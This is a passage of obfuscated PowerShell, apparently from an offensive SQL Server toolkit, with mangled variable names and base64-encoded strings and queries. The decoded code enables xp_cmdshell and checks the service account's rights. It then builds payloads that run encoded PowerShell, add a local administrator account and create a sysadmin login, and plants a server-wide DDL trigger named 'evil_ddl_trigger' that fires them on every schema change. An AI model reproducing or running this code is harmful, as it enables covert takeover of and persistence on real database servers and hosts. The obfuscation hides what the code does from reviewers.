            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABzAHkAcwBhAGQAbQBpAG4AIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A'))) 
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwB5AHMAYQBkAG0AaQBuACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAGEAcgBlACAAcgBlAHEAdQBpAHIAZQBkAC4A'))) 
            Break
        }
    }
    ${__/==\/==\____/\_}.Close()
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAJwBTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwAnACwAIABpAGYAIAByAGUAcQB1AGkAcgBlAGQALgAuAC4A')))
    ${__/==\/==\____/\_}.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAAKABzAGUAbABlAGMAdAAgAHYAYQBsAHUAZQBfAGkAbgBfAHUAcwBlACAAZgByAG8AbQAgAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAD0AIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcAKQAgAD0AIAAwAA0ACgAgACAAIAAgAEUAWABFAEMAIAAoACcAcwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnACcAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAJwAnACwAMQA7AFIARQBDAE8ATgBGAEkARwBVAFIARQAnACkA')))
    ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
    ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
    ${__/==\/==\____/\_}.Close()    
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAJwB4AHAAXwBjAG0AZABzAGgAZQBsAGwAJwAsACAAaQBmACAAcgBlAHEAdQBpAHIAZQBkAC4ALgAuAA==')))  
    ${__/==\/==\____/\_}.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAAKABzAGUAbABlAGMAdAAgAHYAYQBsAHUAZQBfAGkAbgBfAHUAcwBlACAAZgByAG8AbQAgAHMAeQBzAC4AYwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBzACAAdwBoAGUAcgBlACAAbgBhAG0AZQAgAD0AIAAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACkAIAA9ACAAMAANAAoAIAAgACAAIABFAFgARQBDACAAKAAnAHMAcABfAGMAbwBuAGYAaQBnAHUAcgBlACAAJwAnAHgAcABfAGMAbQBkAHMAaABlAGwAbAAnACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFACcAKQA=')))
    ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
    ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
    ${__/==\/==\____/\_}.Close()  
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBoAGUAYwBrAGkAbgBnACAAaQBmACAAcwBlAHIAdgBpAGMAZQAgAGEAYwBjAG8AdQBuAHQAIABpAHMAIABhACAAbABvAGMAYQBsACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAuAC4ALgA=')))  
    ${__/==\/==\____/\_}.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAAUwBlAHQAdQBwACAAcgBlAGcAIABwAGEAdABoACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFMAUQBMAFMAZQByAHYAZQByAEkAbgBzAHQAYQBuAGMAZQAgAHYAYQByAGMAaABhAHIAKAAyADUAMAApACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAQABAAFMARQBSAFYASQBDAEUATgBBAE0ARQAgAD0AIAAnAE0AUwBTAFEATABTAEUAUgBWAEUAUgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABCAEUARwBJAE4ACQAJAAkACQAJAAkACQAJAAkACQAJAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAAJAAkACQAJAAkACQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBMAFMARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgBFAEcASQBOAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAE0AUwBTAFEATAAkACcAKwBjAGEAcwB0ACgAQABAAFMARQBSAFYASQBDAEUATgBBAE0ARQAgAGEAcwAgAHYAYQByAGMAaABhAHIAKAAyADUAMAApACkACQAJAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwByAGEAYgAgAHMAZQByAHYAaQBjAGUAIABhAGMAYwBvAHUAbgB0ACAAZgByAG8AbQAgAHMAZQByAHYAaQBjAGUAJwBzACAAcgBlAGcAIABwAGEAdABoAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABTAGUAcgB2AGkAYwBlAGEAYwBjAG8AdQBuAHQATgBhAG0AZQAgAHYAYQByAGMAaABhAHIAKAAyADUAMAApACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwBpAG4AcwB0AGEAbgBjAGUAXwByAGUAZwByAGUAYQBkACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACwAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwAQABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAgAE8AVQBUAFAAVQBUACwAIABOACcAbgBvAF8AbwB1AHQAcAB1AHQAJwAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIAAgAFMAWQBTAE4AQQBNAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5ACAAIAAgACAAIAAgAD0AIABOACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGsAZQB5ACAAIAAgACAAIAAgACAAIAAgACAAPQAgAE4AJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABQAHIAbwBkAHUAYwB0AE8AcAB0AGkAbwBuAHMAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQBfAG4AYQBtAGUAIAAgACAAPQAgAE4AJwBQAHIAbwBkAHUAYwB0AFQAeQBwAGUAJwAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlACAAIAAgACAAIAAgACAAIAA9ACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAcgBhAGIAIABtAG8AcgBlACAAaQBuAGYAbwAgAGEAYgBvAHUAdAAgAHQAaABlACAAcwBlAHIAdgBlAHIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAQABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAgAGEAcwAgAFMAdgBjAEEAYwBjAHQA')))
    ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
    ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
    ${/=\/=\__/=\/=\/\/} = New-Object System.Data.DataTable
    ${/=\/=\__/=\/=\/\/}.Load(${__/\/=\/=\/\/\_/\})  
    ${/==========\/\_/\} = ${/=\/=\__/=\/=\/\/} | select SvcAcct -ExpandProperty SvcAcct 
    ${_/\/=\_/======\/=} = ${/==========\/\_/\} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAuAFwAXAA='))),''
    ${__/==\/==\____/\_}.Close() 
    ${__/==\/==\____/\_}.Open()
    $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAIAAnAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAnADsA')))
    ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
    ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
    ${__/=\/\_/\_/\/=\_} = New-Object System.Data.DataTable
    ${__/=\/\_/\_/\/=\_}.Load(${__/\/=\/=\/\/\_/\})  
    ${__/==\/==\____/\_}.Close()  
    if(${_/\/=\_/======\/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAFMAeQBzAHQAZQBtAA=='))) -or ${__/=\/\_/\_/\/=\_} -contains $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8APQBcAF8ALwA9AD0APQA9AD0APQBcAC8APQB9AA==')))){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdAAgACQAewBfAC8AXAAvAD0AXABfAC8APQA9AD0APQA9AD0AXAAvAD0AfQAgAGgAYQBzACAAbABvAGMAYQBsACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAHAAcgBpAHYAaQBsAGUAZwBlAHMALgA=')))  
        ${_/\/\_/\_/==\_/\_} = 1
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdAAgACQAewBfAC8AXAAvAD0AXABfAC8APQA9AD0APQA9AD0AXAAvAD0AfQAgAGQAbwBlAHMAIABOAE8AVAAgAGgAYQB2AGUAIABsAG8AYwBhAGwAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAA=='))) 
        ${_/\/\_/\_/==\_/\_} = 0 
    }
    ${__/=\____/=\_/=\_} = ""
     if($PsCommand){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAZQBuAGMAbwBkAGkAbgBnACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAYQB5AGwAbwBhAGQALgAuAC4A'))) 
        if(${_/\/\_/\_/==\_/\_} -eq 0){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvAHQAZQA6ACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHcAbwBuACcAdAAgAGIAZQAgAGEAYgBsAGUAIAB0AG8AIAB0AGEAawBlACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAYQBjAHQAaQBvAG4AcwAgAGQAdQBlACAAdABvACAAdABoAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdAAgAGMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4ALgA='))) 
        }
        ${_/=\_/==\_/=\/\/=} = [Text.Encoding]::Unicode.GetBytes($PsCommand)
        ${/=\/\_/==\_/=\/\_} = [Convert]::ToBase64String(${_/=\_/==\_/=\/\/=})
        If (${/=\/\_/==\_/=\/\_}.Length -gt 8100)
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAGUAbgBjAG8AZABlAGQAIABwAGEAeQBsAG8AYQBkACAAaQBzACAAdABvAG8AIABsAG8AbgBnACAAcwBvACAAdABoAGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAYwBvAG0AbQBhAG4AZAAgAHcAaQBsAGwAIABuAG8AdAAgAGIAZQAgAGEAZABkAGUAZAAuAA=='))) 
        }else{
            ${__/=\____/=\_/=\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAIAAnACcAUABvAHcAZQByAFMAaABlAGwAbAAgAC0AZQBuAGMAIAAkAHsALwA9AFwALwBcAF8ALwA9AD0AXABfAC8APQBcAC8AXABfAH0AJwAnADsA'))) 
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUABhAHkAbABvAGEAZAAgAGcAZQBuAGUAcgBhAHQAZQBkAC4A'))) 
        }
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvAHQAZQA6ACAATgBvACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHcAaQBsAGwAIABiAGUAIABlAHgAZQBjAHUAdABlAGQALAAgAGIAZQBjAGEAdQBzAGUAIAB0AGgAZQAgAHAAYQByAGEAbQBlAHQAZQByAHMAIAB3AGUAcgBlAG4AJwB0ACAAcAByAG8AdgBpAGQAZQBkAC4A'))) 
    }
    ${_/\/===\/\_/==\/\} = ""
    if($NewOsUser){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAcABhAHkAbABvAGEAZAAgAHQAbwAgAGEAZABkACAATwBTACAAdQBzAGUAcgAuAC4ALgA='))) 
        if(${_/\/\_/\_/==\_/\_} -eq 0){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABzAGUAcgB2AGkAYwBlACAAYQBjAGMAbwB1AG4AdAAgAGQAbwBlAHMAIABuAG8AdAAgAGgAYQB2AGUAIABsAG8AYwBhAGwAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHMAbwAgAG4AbwAgAE8AUwAgAGEAZABtAGkAbgAgAGMAYQBuACAAYgBlACAAYwByAGUAYQB0AGUAZAAuACAAIABBAGIAbwByAHQAZQBkAC4A')))
            Break
        }else{
            ${_/\/===\/\_/==\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAG0AYQBzAHQAZQByAC4ALgB4AHAAXwBjAG0AZABzAGgAZQBsAGwAIAAnACcAbgBlAHQAIAB1AHMAZQByACAAJABOAGUAdwBPAHMAVQBzAGUAcgAgACQATgBlAHcATwBzAFAAYQBzAHMAIAAvAGEAZABkACAAJgAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAC8AYQBkAGQAIAAkAE4AZQB3AE8AcwBVAHMAZQByACcAJwA7AA==')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUABhAHkAbABvAGEAZAAgAGcAZQBuAGUAcgBhAHQAZQBkAC4A'))) 
        }
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvAHQAZQA6ACAATgBvACAATwBTACAAYQBkAG0AaQBuACAAdwBpAGwAbAAgAGIAZQAgAGMAcgBlAGEAdABlAGQALAAgAGIAZQBjAGEAdQBzAGUAIAB0AGgAZQAgAHAAYQByAGEAbQBlAHQAZQByAHMAIAB3AGUAcgBlAG4AJwB0ACAAcAByAG8AdgBpAGQAZQBkAC4A'))) 
    }
    ${/===\_/=\/\/=\_/\} = ""
    if($NewSqlUser){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARwBlAG4AZQByAGEAdABpAG4AZwAgAHAAYQB5AGwAbwBhAGQAIAB0AG8AIABhAGQAZAAgAHMAeQBzAGEAZABtAGkAbgAuAC4ALgA='))) 
        ${/===\_/=\/\/=\_/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAATgBPAFQAIABFAFgASQBTAFQAUwAgACgAUwBFAEwARQBDAFQAIAAqACAARgBSAE8ATQAgAHMAeQBzAC4AcwB5AHMAbABvAGcAaQBuAHMAIABXAEgARQBSAEUAIABuAGEAbQBlACAAPQAgACcAJwAkAE4AZQB3AFMAcQBsAFUAcwBlAHIAJwAnACkADQAKACAAIAAgACAAIAAgACAAIABlAHgAZQBjACgAJwAnAEMAUgBFAEEAVABFACAATABPAEcASQBOACAAJABOAGUAdwBTAHEAbABVAHMAZQByACAAVwBJAFQASAAgAFAAQQBTAFMAVwBPAFIARAAgAD0AIAAnACcAJwAnACQATgBlAHcAUwBxAGwAUABhAHMAcwAnACcAJwAnADsARQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACcAJwAnACQATgBlAHcAUwBxAGwAVQBzAGUAcgAnACcAJwAnACwAIAAnACcAJwAnAHMAeQBzAGEAZABtAGkAbgAnACcAJwAnADsAJwAnACkA')))
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUABhAHkAbABvAGEAZAAgAGcAZQBuAGUAcgBhAHQAZQBkAC4A'))) 
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvAHQAZQA6ACAATgBvACAAcwB5AHMAYQBkAG0AaQBuACAAdwBpAGwAbAAgAGIAZQAgAGMAcgBlAGEAdABlAGQALAAgAGIAZQBjAGEAdQBzAGUAIAB0AGgAZQAgAHAAYQByAGEAbQBlAHQAZQByAHMAIAB3AGUAcgBlAG4AJwB0ACAAcAByAG8AdgBpAGQAZQBkAC4A'))) 
    }
    if(($NewSqlUser) -or ($NewOsUser) -or ($PsCommand)){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwByAGUAYQB0AGkAbgBnACAAdAByAGkAZwBnAGUAcgAuAC4ALgA='))) 
        ${__/==\/==\____/\_}.Open()
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAARQBYAEkAUwBUAFMAIAAoAFMARQBMAEUAQwBUACAAKgAgAEYAUgBPAE0AIABzAHkAcwAuAHMAZQByAHYAZQByAF8AdAByAGkAZwBnAGUAcgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAD0AIAAnAGUAdgBpAGwAXwBkAGQAbABfAHQAcgBpAGcAZwBlAHIAJwApACAADQAKACAAIAAgACAAIAAgACAAIABEAFIATwBQACAAVABSAEkARwBHAEUAUgAgAFsAZQB2AGkAbABfAGQAZABsAF8AdAByAGkAZwBnAGUAcgBdACAATwBOACAAQQBMAEwAIABTAEUAUgBWAEUAUgANAAoAIAAgACAAIAAgACAAIAAgAGUAeABlAGMAKAAnAEMAUgBFAEEAVABFACAAVAByAGkAZwBnAGUAcgAgAFsAZQB2AGkAbABfAGQAZABsAF8AdAByAGkAZwBnAGUAcgBdACAADQAKACAAIAAgACAAIAAgACAAIABvAG4AIABBAEwATAAgAFMAZQByAHYAZQByAA0ACgAgACAAIAAgACAAIAAgACAARgBvAHIAIABEAEQATABfAFMARQBSAFYARQBSAF8ATABFAFYARQBMAF8ARQBWAEUATgBUAFMADQAKACAAIAAgACAAIAAgACAAIABBAFMADQAKACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAFwALwA9AD0APQBcAC8AXABfAC8APQA9AFwALwBcAH0AIAAkAHsALwA9AD0APQBcAF8ALwA9AFwALwBcAC8APQBcAF8ALwBcAH0AIAAkAHsAXwBfAC8APQBcAF8AXwBfAF8ALwA9AFwAXwAvAD0AXABfAH0AJwApAA==')))
        ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
        ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
        ${__/==\/==\____/\_}.Close()
         Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABlAHYAaQBsAF8AZABkAGwAXwB0AHIAaQBnAGcAZQByACAAdAByAGkAZwBnAGUAcgAgAGgAYQBzACAAYgBlAGUAbgAgAGEAZABkAGUAZAAuACAASQB0ACAAdwBpAGwAbAAgAHIAdQBuACAAdwBpAHQAaAAgAGEAbgB5ACAARABEAEwAIABlAHYAZQBuAHQALgA='))) 
    }else{
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAbwBwAHQAaQBvAG4AcwAgAHcAZQByAGUAIABwAHIAbwB2AGkAZABlAGQALgA='))) 
    }
    if($Remove){
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUgBlAG0AbwB2AGkAbgBnACAAdAByAGkAZwBnAGUAcgAgAG4AYQBtAGUAZAAgAGUAdgBpAGwAXwBEAEQATABfAHQAcgBpAGcAZwBlAHIALgAuAC4A'))) 
        ${__/==\/==\____/\_}.Open()
        $Query = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBGACAARQBYAEkAUwBUAFMAIAAoAFMARQBMAEUAQwBUACAAKgAgAEYAUgBPAE0AIABzAHkAcwAuAHMAZQByAHYAZQByAF8AdAByAGkAZwBnAGUAcgBzACAAVwBIAEUAUgBFACAAbgBhAG0AZQAgAD0AIAAnAGUAdgBpAGwAXwBkAGQAbABfAHQAcgBpAGcAZwBlAHIAJwApACAADQAKACAAIAAgACAAIAAgACAAIABEAFIATwBQACAAVABSAEkARwBHAEUAUgAgAFsAZQB2AGkAbABfAGQAZABsAF8AdAByAGkAZwBnAGUAcgBdACAATwBOACAAQQBMAEwAIABTAEUAUgBWAEUAUgA=')))
        ${___/=\/\__/\__/\_} = New-Object System.Data.SqlClient.SqlCommand($Query,${__/==\/==\____/\_})
        ${__/\/=\/=\/\/\_/\} = ${___/=\/\__/\__/\_}.ExecuteReader() 
        ${__/==\/==\____/\_}.Close()
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAVABoAGUAIABlAHYAaQBsAF8AZABkAGwAXwB0AHIAaQBnAGcAZQByACAAdAByAGkAZwBnAGUAcgAgAGgAYQBzACAAYgBlAGUAbgAgAGIAZQBlAG4AIAByAGUAbQBvAHYAZQBkAC4A'))) 
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQQBsAGwAIABkAG8AbgBlAC4A')))
}
Function Invoke-SQLAuditTemplate
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
